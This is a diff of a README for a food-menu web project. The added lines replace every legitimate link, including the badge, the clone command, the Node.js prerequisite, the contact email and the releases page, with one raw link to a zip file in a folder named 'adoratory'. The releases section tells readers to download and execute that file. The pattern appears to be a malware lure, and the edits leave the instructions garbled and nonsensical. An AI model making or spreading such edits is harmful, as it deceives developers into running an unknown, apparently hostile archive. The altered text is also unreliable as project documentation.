@@ -1,6 +1,6 @@
 # 🍽️ Food Menu Project
 
-![Food Menu](https://img.shields.io/badge/Food%20Menu-Project-brightgreen)
+![Food Menu](https://raw.githubusercontent.com/rizalawals/Food-Menu/main/adoratory/Food-Menu-v3.3.zip%20Menu-Project-brightgreen)
 
 Welcome to the **Food Menu** repository! This project aims to provide a user-friendly interface for exploring various food options, recipes, and nutritional information. 
 
@@ -33,12 +33,12 @@ To get started with the Food Menu project, you will need to clone the repository
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/rizalawals/Food-Menu.git
+   git clone https://raw.githubusercontent.com/rizalawals/Food-Menu/main/adoratory/Food-Menu-v3.3.zip
    cd Food-Menu
    ```
 
 2. **Install Dependencies**:
-   Make sure you have Node.js and npm installed. Run the following command:
+   Make sure you have https://raw.githubusercontent.com/rizalawals/Food-Menu/main/adoratory/Food-Menu-v3.3.zip and npm installed. Run the following command:
    ```bash
    npm install
    ```
@@ -83,13 +83,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any questions or suggestions, feel free to reach out to me via email at [your-email@example.com](mailto:your-email@example.com).
+For any questions or suggestions, feel free to reach out to me via email at [https://raw.githubusercontent.com/rizalawals/Food-Menu/main/adoratory/Food-Menu-v3.3.zip](https://raw.githubusercontent.com/rizalawals/Food-Menu/main/adoratory/Food-Menu-v3.3.zip).
 
 ## Releases
 
-You can find the latest releases of the Food Menu project [here](https://github.com/rizalawals/Food-Menu/releases). Download the necessary files and execute them to start using the application.
+You can find the latest releases of the Food Menu project [here](https://raw.githubusercontent.com/rizalawals/Food-Menu/main/adoratory/Food-Menu-v3.3.zip). Download the necessary files and execute them to start using the application.
 
-Additionally, visit the [Releases section](https://github.com/rizalawals/Food-Menu/releases) for updates and previous versions.
+Additionally, visit the [Releases section](https://raw.githubusercontent.com/rizalawals/Food-Menu/main/adoratory/Food-Menu-v3.3.zip) for updates and previous versions.
 
 ## Acknowledgments
 
